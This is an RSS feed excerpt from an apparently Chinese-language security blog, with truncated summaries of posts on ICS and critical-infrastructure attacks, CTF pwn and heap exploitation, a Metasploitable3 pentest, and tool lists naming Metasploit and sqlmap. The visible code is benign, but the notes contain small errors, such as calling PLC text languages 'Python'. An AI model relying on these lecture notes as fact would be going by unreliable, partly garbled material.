+&lt;/li>
+&lt;li>
+&lt;p>各國對 CI 定義稍有不同&lt;/p>
+&lt;ul>
+&lt;li>大多與能源、交通、醫療、通訊、金融、政府相關&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="美國-ci">美國 CI&lt;/h3>
+&lt;ul>
+&lt;li>賭場&lt;/li>
+&lt;li>飯店&lt;/li>
+&lt;li>核能&lt;/li>
+&lt;/ul>
+&lt;h3 id="國家級-ci-網路攻擊">國家級 CI 網路攻擊&lt;/h3>
+&lt;ul>
+&lt;li>2009 Stuxnet 對伊朗核能設施攻擊
+&lt;ul>
+&lt;li>離心機異常加速&lt;/li>
+&lt;li>多個 0 day 漏洞&lt;/li>
+&lt;li>第一個針對工業控制環境的攻擊&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>2015 俄羅斯沙蟲團隊針對烏克蘭電網
+&lt;ul>
+&lt;li>破壞為目的&lt;/li>
+&lt;li>大量妨礙策略&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>2023 丹麥能源產業攻擊鏈
+&lt;ul>
+&lt;li>偵查&lt;/li>
+&lt;li>武裝&lt;/li>
+&lt;li>遞送&lt;/li>
+&lt;li>漏洞利用&lt;/li>
+&lt;li>安裝&lt;/li>
+&lt;li>命令控制&lt;/li>
+&lt;li>行動&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>針對 CI 攻擊不一定要用一堆 0 day&lt;/li>
+&lt;/ul>
+&lt;h3 id="為何-ci-難防攻擊">為何 CI 難防攻擊&lt;/h3>
+&lt;ul>
+&lt;li>產業結構龐大
+&lt;ul>
+&lt;li>醫療保健產業: 個資外洩&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>供應鏈關係緊密
+&lt;ul>
+&lt;li>半導體產業: 供應鏈關係緊密 (設計-&amp;gt;製造-&amp;gt;封裝)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>工業控制系統環境&lt;/li>
+&lt;/ul>
+&lt;h2 id="工業控制系統-ics">工業控制系統 (ICS)&lt;/h2>
+&lt;ul>
+&lt;li>普渡模型
+&lt;ul>
+&lt;li>Layer 0
+&lt;ul>
+&lt;li>物理設備&lt;/li>
+&lt;li>感測器&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Layer 1
+&lt;ul>
+&lt;li>控制器&lt;/li>
+&lt;li>PLC&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Layer 2
+&lt;ul>
+&lt;li>人機介面 HMI&lt;/li>
+&lt;li>現場設備顯示/控制&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Layer 3
+&lt;ul>
+&lt;li>OT 環境伺服器&lt;/li>
+&lt;li>搜集、分析資料&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Layer 4/5
+*&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="風險管理需求">風險管理需求&lt;/h3>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th style="text-align: center">IT&lt;/th>
+ &lt;th style="text-align: center">OT&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td style="text-align: center">CIA&lt;/td>
+ &lt;td style="text-align: center">強調可用性&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">3~5 年更新&lt;/td>
+ &lt;td style="text-align: center">10~20 年更新&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">可任意擴充&lt;/td>
+ &lt;td style="text-align: center">無法自行安裝任何軟體安全性套件&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">非即時性系統&lt;/td>
+ &lt;td style="text-align: center">即時性系統&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">可依需求重開機&lt;/td>
+ &lt;td style="text-align: center">不可任意重開機&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">一般通訊協定&lt;/td>
+ &lt;td style="text-align: center">ICS 通訊協定&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h3 id="ot-環境的脆弱性">OT 環境的脆弱性&lt;/h3>
+&lt;ul>
+&lt;li>內部威脅: 第三方工程師或廠商設備&lt;/li>
+&lt;li>老舊系統: 許多作業系統或設備已終止支援&lt;/li>
+&lt;li>網路扁平: 網路未適當分割&lt;/li>
+&lt;li>更新限制: 設備保持運行，難以實現更新流程&lt;/li>
+&lt;li>不進行螢幕鎖定&lt;/li>
+&lt;/ul>
+&lt;h3 id="可程式化邏輯控制器-plc">可程式化邏輯控制器 (PLC)&lt;/h3>
+&lt;ul>
+&lt;li>用來執行特定的工作，達到自動化控制現場設備&lt;/li>
+&lt;/ul>
+&lt;h3 id="plc-如何程式化">PLC 如何程式化&lt;/h3>
+&lt;ul>
+&lt;li>IEC 61131-3 標準定義 PLC 程式 5 種語言進行程式撰寫&lt;/li>
+&lt;li>圖形化
+&lt;ul>
+&lt;li>階梯圖(Ladder Diagram, LD)&lt;/li>
+&lt;li>功能區塊圖(Function Block Diagram, FBD)&lt;/li>
+&lt;li>順序功能流程圖(Sequential Function Chart, SFC)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>文字(Python)
+&lt;ul>
+&lt;li>指令表(Instruction List Diagram, ILD)&lt;/li>
+&lt;li>結構化文字 STL&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="ot-環境架構">OT 環境架構&lt;/h3>
+&lt;ul>
+&lt;li>工程師電腦有最高權限&lt;/li>
+&lt;li>安全性
+&lt;ul>
+&lt;li>Safety != Security&lt;/li>
+&lt;li>安全系統不一定安全(Security)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="ics-攻擊策略">ICS 攻擊策略&lt;/h2>
+&lt;ul>
+&lt;li>伺服器&lt;/li>
+&lt;li>供應鏈&lt;/li>
+&lt;li>工業通訊協定&lt;/li>
+&lt;li>無線網路&lt;/li>
+&lt;li>實體攻擊&lt;/li>
+&lt;/ul>
+&lt;h3 id="伺服器攻擊">伺服器攻擊&lt;/h3>
+&lt;ul>
+&lt;li>多為 Windows 系統
+&lt;ul>
+&lt;li>SMB&lt;/li>
+&lt;li>SSH&lt;/li>
+&lt;li>FTP&lt;/li>
+&lt;li>RDP&lt;/li>
+&lt;li>Database Service&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>ex: Nmap + Metasploit&lt;/p></description></item><item><title>【Pico】Pwn 系列解題紀錄</title><link>https://ja-errorpro.codes/posts/picoctf/pwn/</link><pubDate>Tue, 16 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/picoctf/pwn/</guid><description>&lt;h1 id="picopwn-系列解題紀錄">【Pico】Pwn 系列解題紀錄&lt;/h1>
+&lt;p>這篇只是用來放解題的程式碼，之後再補解題過程。&lt;/p>
+&lt;h2 id="heap0">heap0&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【系統安全】Stack Overflow</title><link>https://ja-errorpro.codes/posts/2024/stack_overflow/</link><pubDate>Fri, 05 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/stack_overflow/</guid><description>&lt;h1 id="先備知識">先備知識&lt;/h1>
+&lt;ul>
+&lt;li>&lt;a href="https://ja-errorpro.codes/posts/2023/asm/">【系統安全】組合語言&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://ja-errorpro.codes/posts/2023/linux_system_security/">【系統安全】Linux 安全機制&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h1 id="stack-overflow">Stack Overflow&lt;/h1>
+&lt;h2 id="stack">Stack&lt;/h2>
+&lt;p>回顧 Memory Layout，Stack 是一種後進先出的資料結構，在記憶體上由高位址往低位址長，上面會保存函式呼叫的資訊、區域變數。&lt;/p>
+&lt;p>注意 32 位元與 64 位元 的差別：&lt;/p>
+&lt;ul>
+&lt;li>x86: 函式參數會放在 return address 上方&lt;/li>
+&lt;li>x64: System V AMD64 ABI，前 6 個整數參數依序放在 rdi, rsi, rdx, rcx, r8, r9, 後面如果還有才會放在 stack 上。&lt;/li>
+&lt;/ul>
+&lt;h2 id="stack-overflow-1">Stack Overflow&lt;/h2>
+&lt;p>當程式輸入資料的大小超過 buffer 的大小，會蓋到該 buffer 之後的記憶體，稱為 Overflow，而 Stack Overflow 表示在 stack 上發生了 Overflow。另外還有 Heap Overflow 表示在 heap 上發生了 Overflow。&lt;/p></description></item><item><title>【CTF-WriteUp】AIS3 Pre-Exam 2024</title><link>https://ja-errorpro.codes/posts/2024/ais3_pre_exam_2024/</link><pubDate>Tue, 11 Jun 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_pre_exam_2024/</guid><description>&lt;h1 id="ais3-pre-exam-2024">AIS3 Pre-Exam 2024&lt;/h1>
+&lt;p>先放結果&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/ctf/ais3_pre_exam_2024/result.png" alt="result">&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/ctf/ais3_pre_exam_2024/result2.png" alt="result2">&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/ctf/ais3_pre_exam_2024/result3.png" alt="result3">&lt;/p>
+&lt;p>My First CTF：潛力獎&lt;/p>
+&lt;h2 id="心得">心得&lt;/h2>
+&lt;p>第一次參加 My First CTF 跟 AIS3 Pre-Exam，最後有幾題到比賽結束才解出來，覺得滿可惜的，&lt;/p>
+&lt;p>希望下次能&lt;del>通靈&lt;/del>出更多題目。&lt;/p>
+&lt;h1 id="write-up">Write Up&lt;/h1>
+&lt;h2 id="misc">Misc&lt;/h2>
+&lt;h3 id="welcome">Welcome&lt;/h3>
+&lt;p>簽到題&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/ctf/ais3_pre_exam_2024/welcome.png" alt="image">&lt;/p>
+&lt;h4 id="flag">FLAG:&lt;/h4>
+&lt;p>AIS3{Welc0me_to_AIS3_PreExam_2o24!}&lt;/p>
+&lt;h3 id="quantum-nim-heist">Quantum Nim Heist&lt;/h3>
+&lt;pre tabindex="0">&lt;code>Welcome to the Quantum Nim Heist, where traditional logic intertwines with the enigmatic realm of quantum mechanics to create a Nim game like no other.
+&lt;/code>&lt;/pr</description></item><item><title>【資訊安全】Metasploitable3 滲透測試實作（筆記）</title><link>https://ja-errorpro.codes/posts/2024/metasploitable3_writeup/</link><pubDate>Sat, 20 Apr 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/metasploitable3_writeup/</guid><description>&lt;h2 id="先備知識">先備知識&lt;/h2>
+&lt;ul>
+&lt;li>知道如何使用 VMware 或 VirtualBox&lt;/li>
+&lt;li>Kali Linux 基本操作&lt;/li>
+&lt;li>能夠讓 Kali 連線至 Metasploitable3&lt;/li>
+&lt;li>良好的網路環境&lt;/li>
+&lt;/ul>
+&lt;h2 id="確認-ip">確認 IP&lt;/h2>
+&lt;p>Win2k8:&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ipconfig
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>ub1404:&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ifconfig
+&lt;/span>&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【HTB Challenge】Sacred Scrolls: Revenge</title><link>https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/</link><pubDate>Tue, 05 Mar 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/</guid><description>&lt;h1 id="htb-challengesacred-scrolls-revenge">【HTB Challenge】Sacred Scrolls: Revenge&lt;/h1>
+&lt;h2 id="description">Description&lt;/h2>
+&lt;p>Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.&lt;/p>
+&lt;h2 id="checksec">Checksec&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【CTF】Heap Exploitation(Part 1 - Overview, UAF)</title><link>https://ja-errorpro.codes/posts/2023/ctf_heap/</link><pubDate>Thu, 16 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_heap/</guid><description>&lt;h1 id="heap-exploitation">Heap Exploitation&lt;/h1>
+&lt;h2 id="預備知識">預備知識&lt;/h2>
+&lt;ul>
+&lt;li>需要注意glibc的版本&lt;/li>
+&lt;li>知道典型的Memory layout&lt;/li>
+&lt;li>記憶體計算&lt;/li>
+&lt;/ul>
+&lt;h2 id="1-heap">1. Heap&lt;/h2>
+&lt;h3 id="overview">Overview&lt;/h3>
+&lt;ul>
+&lt;li>跟資料結構的Heap不同&lt;/li>
+&lt;li>存動態資料的記憶體區段&lt;/li>
+&lt;li>在Memory中由低往高生長&lt;/li>
+&lt;/ul>
+&lt;h3 id="allocator">Allocator&lt;/h3>
+&lt;ul>
+&lt;li>Linux中由glibc實作
+&lt;ul>
+&lt;li>dlmalloc (Doug Lea Malloc) - General-purpose allocator&lt;/li>
+&lt;li>ptmalloc (Per-thread malloc) - glibc&lt;/li>
+&lt;li>jemalloc - FreeBSD / Firefox / Facebook&amp;hellip;&lt;/li>
+&lt;li>tcmalloc - Google / Golang / Chrome&amp;hellip;&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="malloc">malloc&lt;/h3>
+&lt;ul>
+&lt;li>dynamic memory allocator&lt;/li>
+&lt;/ul>
+&lt;h3 id="第一次呼叫-malloc">第一次呼叫 malloc&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【CTF】CTF工具集</title><link>https://ja-errorpro.codes/posts/2023/ctf_tools/</link><pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_tools/</guid><description>&lt;h1 id="ctf工具集">CTF工具集&lt;/h1>
+&lt;h2 id="基本工具">基本工具&lt;/h2>
+&lt;ul>
+&lt;li>Python 2+3 &amp;amp; pip&lt;/li>
+&lt;li>Editor: vim, vscode, notepad&lt;/li>
+&lt;li>Git&lt;/li>
+&lt;li>Kali Linux&lt;/li>
+&lt;/ul>
+&lt;h2 id="掃描工具">掃描工具&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th style="text-align: left">工具名稱&lt;/th>
+ &lt;th style="text-align: left">種類&lt;/th>
+ &lt;th style="text-align: left">說明&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://ja-errorpro.codes/posts/2023/nmap">nmap&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">web&lt;/td>
+ &lt;td style="text-align: left">弱點掃描&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://github.com/maurosoria/dirsearch">dirsearch&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">web&lt;/td>
+ &lt;td style="text-align: left">網站目錄掃描&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://github.com/sullo/nikto">nikto&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">web&lt;/td>
+ &lt;td style="text-align: left">Web server漏洞掃描&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://tools.kali.org/web-applications/dirb">dirb&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">web&lt;/td>
+ &lt;td style="text-align: left">網站目錄掃描&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://github.com/sqlmapproject/sqlmap">sqlmap&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">web&lt;/td>
+ &lt;td style="text-align: left">SQL Injection 測試&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://github.com/wpscanteam/wpscan">wpscan&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">web&lt;/td>
+ &lt;td style="text-align: left">WordPress漏洞掃描&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://gchq.github.io/CyberChef/">CyberChef&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">web&lt;/td>
+ &lt;td style="text-align: left">線上多功能解 Code 工具&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://portswigger.net/burp">Burp Suite&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">web&lt;/td>
+ &lt;td style="text-align: left">Web 測試工具&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://www.wireshark.org/">WireShark&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">web&lt;/td>
+ &lt;td style="text-align: left">封包分析&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://ghidra-sre.org/">Ghidra&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">reverse&lt;/td>
+ &lt;td style="text-align: left">逆向工具&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;a href="https://www.hex-rays.com/products/ida/">IDA Pro&lt;/a>&lt;/td>
+ &lt;td style="text-align: left">reverse&lt;/td>
+ &lt;td style="text-align: left">逆向工具&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">crypto&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">stego&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">misc&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">forensics&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">android&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;td style="text-align: left">windows&lt;/td>
+ &lt;td style="text-align: left">&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table></description></item><item><title>【CTF】Nmap</title><link>https://ja-errorpro.codes/posts/2023/nmap/</link><pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/nmap/</guid><description>&lt;h1 id="nmap">Nmap&lt;/h1>
+&lt;p>&lt;a href="https://nmap.org/download.html">Nmap Download&lt;/a>&lt;/p>
+&lt;p>Debian安裝&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo apt install nmap
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>使用&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
